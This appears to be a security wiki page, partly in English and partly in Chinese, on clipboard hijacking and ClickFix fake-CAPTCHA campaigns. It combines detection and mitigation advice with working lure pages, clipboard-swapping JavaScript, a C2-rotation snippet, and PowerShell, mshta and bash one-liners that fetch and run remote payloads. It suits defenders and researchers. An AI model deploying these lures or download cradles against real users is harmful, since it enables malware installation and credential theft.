# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – old but still valid advice

## Overview

Clipboard hijacking – also known as *pastejacking* – abuses the fact that users routinely copy-and-paste commands without inspecting them. A malicious web page (or any JavaScript-capable context such as an Electron or Desktop application) programmatically places attacker-controlled text into the system clipboard. Victims are encouraged, normally by carefully crafted social-engineering instructions, to press **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), or open a terminal and *paste* the clipboard content, immediately executing arbitrary commands.

Because **no file is downloaded and no attachment is opened**, the technique bypasses most e-mail and web-content security controls that monitor attachments, macros or direct command execution. The attack is therefore popular in phishing campaigns delivering commodity malware families such as NetSupport RAT, Latrodectus loader or Lumma Stealer.

## Wallet-address replacement clippers

Another **clipboard hijacking** variant does not paste commands at all: it waits until the victim copies a **cryptocurrency wallet address**, then silently swaps it for an attacker-controlled one just before paste. This is especially effective against long wallet formats because users often only verify the first/last characters.

Common real-world traits:
- **Thin loader + nested payload**: the visible app/exe looks like a legitimate trading or "profit" tool, while the real clipper is hidden deeper in the bundle (for example a .NET loader launching a nested Rust payload).
- **Regex-driven replacement**: the malware matches strings such as `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, or even generic **44-character Solana-like** strings and rewrites them to attacker wallets.
- **Wallet rotation at scale**: modern Windows samples may embed **thousands** of replacement wallets per currency instead of a single static address, reducing wallet reputation burn after each theft.

### Windows clipper flow

A common implementation is a hidden window registered with **`AddClipboardFormatListener`**. On each clipboard update, the malware typically calls:
- **`OpenClipboard`** → access current clipboard data.
- **`GetClipboardData`** → read text.
- **`EmptyClipboard`** + **`SetClipboardData`** → replace the wallet string with the attacker value.

Minimal hunting regexes frequently seen in clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
用户级持久化就足以造成影响。一个已观察到的模式是：
- 将 payload 复制到 **`%APPDATA%\silke\silke.exe`**
- 在 `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` 下创建一个 **Startup-folder LNK**

检测思路：
- 既持续调用 clipboard APIs、又在 `%APPDATA%` 和用户 **Startup** 文件夹下写入的进程。
- 新建 LNK/executable 之后紧接着出现 wallet-address clipboard 重写。
- 包含大量未使用文件、以及一个启动 nested binary 的小型 launcher 的压缩包或伪装软件捆绑包。

### macOS social-engineered quarantine removal + LaunchAgent persistence

在 macOS 上，一些 campaign 会附带一个 **`unlocker.command`** helper，并诱导受害者在 Gatekeeper 提示应用已损坏或来自未识别开发者时，右键 → **Open**。该脚本只是移除 quarantine 并启动附近的 `.app`：
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
这**不是** Gatekeeper 漏洞利用；这是一个**社会工程式的 quarantine bypass**，它滥用了 Gatekeeper 的判定依赖于 `com.apple.quarantine` xattr 这一事实。

执行后，clipper 可以通过写入以下内容以当前用户身份持久化：
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – 带有 `RunAtLoad` 和 `KeepAlive` 的 LaunchAgent

一个有用的防御细节是，某些样本实现了一个**自我修复 watchdog**，会每隔约 30 秒重写 LaunchAgent 和 wrapper。如果你先删除 plist **而不终止正在运行的进程**，恶意软件可能会立即重新创建它。安全清理顺序：
1. 杀掉活动的 clipper 进程。
2. 卸载/删除 LaunchAgent plist。
3. 删除 `~/launch.sh` 和复制的 payload。

### Delivery note: fake reputation as a force multiplier

对于这个家族，恶意软件本身可以保持技术上很简单，而**分发层**承担主要工作：伪造 GitHub stars/forks、SourceForge reviews/downloads、YouTube 教程评论/观看数，以及看起来无害的 VirusTotal comments/votes，都被用来让二进制在执行前显得可信。

## Forced copy buttons and hidden payloads (macOS one-liners)

一些 macOS infostealers 会克隆安装站点（例如 Homebrew），并**强制使用“Copy”按钮**，这样用户就无法只选中可见文本。clipboard 条目包含预期的安装命令以及附加的 Base64 payload（例如 `...; echo <b64> | base64 -d | sh`），因此一次粘贴就会执行两部分，而 UI 会隐藏额外的阶段。

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
旧的 campaigns 使用 `document.execCommand('copy')`，新的则依赖异步的 **Clipboard API** (`navigator.clipboard.writeText`)。

## The ClickFix / ClearFake Flow

1. 用户访问一个 typo squatted 或被入侵的网站（例如 `docusign.sa[.]com`）
2. 注入的 **ClearFake** JavaScript 调用 `unsecuredCopyToClipboard()` helper，静默地把一个 Base64 编码的 PowerShell one-liner 存入剪贴板。
3. HTML instructions 告诉受害者：*“按下 **Win + R**，粘贴命令并按 Enter 以解决问题。”*
4. `powershell.exe` 执行后，下载一个 archive，其中包含一个合法 executable 和一个恶意 DLL（典型的 DLL sideloading）。
5. loader 解密额外 stages，注入 shellcode 并安装 persistence（例如 scheduled task）——最终运行 NetSupport RAT / Latrodectus / Lumma Stealer。

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe`（合法的 Java WebStart）会在其目录中搜索 `msvcp140.dll`。
* 恶意 DLL 使用 **GetProcAddress** 动态解析 APIs，通过 **curl.exe** 下载两个二进制文件（`data_3.bin`、`data_4.bin`），使用滚动 XOR key `"https://google.com/"` 对其解密，注入最终的 shellcode，并将 **client32.exe**（NetSupport RAT）解压到 `C:\ProgramData\SecurityCheck_v1\`。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. 使用 **curl.exe** 下载 `la.txt`
2. 在 **cscript.exe** 中执行 JScript downloader
3. 获取 MSI payload → 将 `libcef.dll` 放在一个已签名应用程序旁边 → DLL sideloading → shellcode → Latrodectus。

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** 调用启动了一个隐藏的 PowerShell 脚本，该脚本检索 `PartyContinued.exe`，提取 `Boat.pst` (CAB)，通过 `extrac32` 和文件拼接重建 `AutoIt3.exe`，最后运行一个 `.a3x` 脚本，该脚本将浏览器凭据外传到 `sumeriavgv.digital`。

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

一些 ClickFix campaigns 会完全跳过文件下载，并指示受害者粘贴一个单行命令，通过 WSH 获取并执行 JavaScript，进行持久化，并按日轮换 C2。示例观察到的链路：
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
关键特征
- 运行时对混淆后的 URL 进行反转，以规避随意检查。
- JavaScript 通过 Startup LNK（WScript/CScript）实现持久化，并按当前日期选择 C2——从而支持快速 domain rotation。

用于按日期轮换 C2 的最小 JS 片段：
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
下一阶段通常会部署一个 loader，用于建立持久化并拉取 RAT（例如 PureHVNC），通常会对 TLS 做 pinning 到硬编码证书，并对流量进行分块传输。

此变种的检测思路
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js`（或 `cscript.exe`）。
- 启动项痕迹：`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` 中的 LNK 调用 WScript/CScript，并使用位于 `%TEMP%`/`%APPDATA%` 下的 JS 路径。
- Registry/RunMRU 和 command-line telemetry 中包含 `.split('').reverse().join('')` 或 `eval(a.responseText)`。
- 反复出现的 `powershell -NoProfile -NonInteractive -Command -`，并带有很大的 stdin payload，用于在不拉长 command line 的情况下输入长脚本。
- 后续执行 LOLBins 的 Scheduled Tasks，例如在看起来像 updater 的 task/path 下执行 `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`（例如 `\GoogleSystem\GoogleUpdater`）。

Threat hunting
- 每日轮换的 C2 主机名和 URL，带有 `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` 模式。
- 关联 clipboard 写入事件，随后是 Win+R 粘贴，再紧接着 `powershell.exe` 执行。

Blue-teams 可以结合 clipboard、process-creation 和 registry telemetry 来定位 pastejacking abuse：

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` 会保留 **Win + R** 命令历史——关注异常的 Base64 / 混淆条目。
* Security Event ID **4688** (Process Creation)，其中 `ParentImage` == `explorer.exe` 且 `NewProcessName` 在 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } 中。
* Event ID **4663**，用于 `%LocalAppData%\Microsoft\Windows\WinX\` 或临时文件夹下的文件创建，且发生在可疑的 4688 事件之前。
* EDR clipboard sensors（如果存在）——关联 `Clipboard Write` 紧接着出现的新 PowerShell process。

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

最近的 campaigns 大量生成伪造的 CDN/browser verification pages（“Just a moment…”, IUAM-style），诱导用户将其 clipboard 中的 OS-specific commands 复制到原生 consoles 中。这样可以把 execution 从 browser sandbox 中转移出来，并且可在 Windows 和 macOS 上工作。

builder 生成页面的关键特征
- 通过 `navigator.userAgent` 进行 OS detection，以便定制 payloads（Windows PowerShell/CMD vs. macOS Terminal）。对不支持的 OS 可选使用 decoys/no-ops，以维持伪装。
- 在无害的 UI 操作（checkbox/Copy）时自动 clipboard-copy，而可见文本可能与 clipboard content 不同。
- Mobile blocking 以及带有分步说明的 popover：Windows → Win+R→paste→Enter；macOS → open Terminal→paste→Enter。
- 可选的 obfuscation 和单文件 injector，用于用 Tailwind-styled verification UI 覆盖被入侵站点的 DOM（无需新注册域名）。

示例：clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS 持久化首次运行
- 使用 `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`，这样即使 terminal 关闭后执行也会继续，从而减少可见痕迹。

被入侵站点上的原地页面接管
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
检测与狩猎思路，针对 IUAM-style lures

- Web: 将 Clipboard API 绑定到 verification widgets 的页面；显示文本与剪贴板 payload 不匹配；`navigator.userAgent` 分支判断；在可疑上下文中的 Tailwind + single-page replace。
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` 紧跟浏览器交互之后；从 `%TEMP%` 执行的 batch/MSI 安装器。
- macOS endpoint: Terminal/iTerm 在浏览器事件附近启动 `bash`/`curl`/`base64 -d` 并使用 `nohup`；关闭 terminal 后仍然存活的后台任务。
- 关联 `RunMRU` Win+R 历史和 clipboard writes，以及随后出现的 console process creation。

另见支持性技术

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake 继续入侵 WordPress sites，并注入 loader JavaScript，通过链式调用 external hosts（Cloudflare Workers、GitHub/jsDelivr），甚至 blockchain “etherhiding” calls（例如向 Binance Smart Chain API endpoints 发起 POST，如 `bsc-testnet.drpc[.]org`）来拉取当前的 lure logic。最近的 overlay 大量使用 fake CAPTCHAs，指示用户复制/粘贴一行命令（T1204.004），而不是下载任何东西。
- Initial execution 越来越多地委派给 signed script hosts/LOLBAS。2026 年 1 月的链路把早先的 `mshta` 用法替换为通过 `WScript.exe` 执行的内置 `SyncAppvPublishingServer.vbs`，并传入带有 aliases/wildcards 的 PowerShell-like arguments 以获取远程内容：
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` 是已签名且通常由 App-V 使用的；与 `WScript.exe` 搭配并结合异常参数（`gal`/`gcm` 别名、带通配符的 cmdlets、jsDelivr URLs）时，它就会成为 ClearFake 的高信号 LOLBAS 阶段。
- 2026 年 2 月的 fake CAPTCHA payloads 又回到了纯 PowerShell download cradles。两个 live examples：
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- First chain 是一个内存中的 `iex(irm ...)` grabber；第二个通过 `WinHttp.WinHttpRequest.5.1` 分阶段，写入一个临时 `.ps1`，然后在隐藏窗口中使用 `-ep bypass` 启动。

检测/狩猎这些变种的提示
- Process lineage：browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs`，或者在 clipboard 写入/Win+R 之后立即出现 PowerShell cradles。
- Command-line keywords：`SyncAppvPublishingServer.vbs`、`WinHttp.WinHttpRequest.5.1`、`-UseBasicParsing`、`%TEMP%\FVL.ps1`、jsDelivr/GitHub/Cloudflare Worker 域名，或者原始 IP 的 `iex(irm ...)` 模式。
- Network：从 script hosts/PowerShell 在 web browsing 之后不久向 CDN worker hosts 或 blockchain RPC endpoints 发起 outbound 连接。
- File/registry：在 `%TEMP%` 下创建临时 `.ps1`，以及包含这些 one-liners 的 RunMRU 条目；对使用 external URLs 或混淆过的 alias strings 执行的 signed-script LOLBAS（WScript/cscript/mshta）进行 block/alert。

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
